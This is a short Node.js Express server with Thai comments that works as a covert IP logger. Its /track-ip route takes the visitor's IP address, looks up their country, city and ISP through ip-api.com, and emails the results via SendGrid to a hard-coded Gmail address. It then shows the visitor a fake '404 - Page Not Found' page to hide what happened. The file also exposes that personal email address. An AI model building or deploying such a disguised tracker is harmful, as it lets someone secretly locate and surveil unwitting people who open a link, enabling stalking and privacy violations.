const express = require("express");
const axios = require("axios");
const sgMail = require("@sendgrid/mail");
const path = require("path");
require("dotenv").config();

const app = express();
const port = 3000;

// ตั้งค่า API Key ของ SendGrid
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

app.use(express.static(path.join(__dirname)));

// Route สำหรับดึงข้อมูล IP และส่งอีเมล
app.get("/track-ip", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  try {
    const geoData = await axios.get(`http://ip-api.com/json/${ip}`);
    const locationData = geoData.data;

    const emailContent = `
            มีผู้เข้าชมเว็บไซต์:
            - IP Address: ${ip}
            - ประเทศ: ${locationData.country}
            - เมือง: ${locationData.city}
            - ISP: ${locationData.isp}
            - เวลาที่เข้าชม: ${new Date().toISOString()}
        `;

    const msg = {
      to: "taston4412@gmail.com", // อีเมลปลายทาง
      from: "taston4412@gmail.com", // อีเมลที่ผ่านการยืนยันกับ SendGrid
      subject: "แจ้งเตือน: มีผู้เข้าชมเว็บไซต์",
      text: emailContent,
    };

    await sgMail.send(msg);
    console.log("ส่งอีเมลสำเร็จ");

    // แสดงหน้า Error (เช่น หน้า 404)
    res.status(404).send(`
            <h1>404 - Page Not Found</h1>
            <p>The page you are looking for does not exist.</p>
        `);
  } catch (error) {
    console.error("เกิดข้อผิดพลาดในการส่งอีเมล:", error.message);
    res.status(500).send("เกิดข้อผิดพลาดในการส่งข้อมูล");
  }
});

// Start Server
app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});
